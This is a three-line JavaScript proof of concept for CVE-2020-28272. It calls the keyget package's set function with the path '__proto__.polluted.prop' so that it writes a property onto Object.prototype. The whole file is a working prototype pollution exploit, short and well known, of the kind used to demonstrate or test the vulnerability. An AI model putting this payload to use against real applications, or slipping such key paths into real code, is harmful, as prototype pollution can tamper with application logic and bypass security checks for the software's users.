//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272 
var keyget = require("keyget")

keyget.set({}, '__proto__.polluted.prop', 'yes');
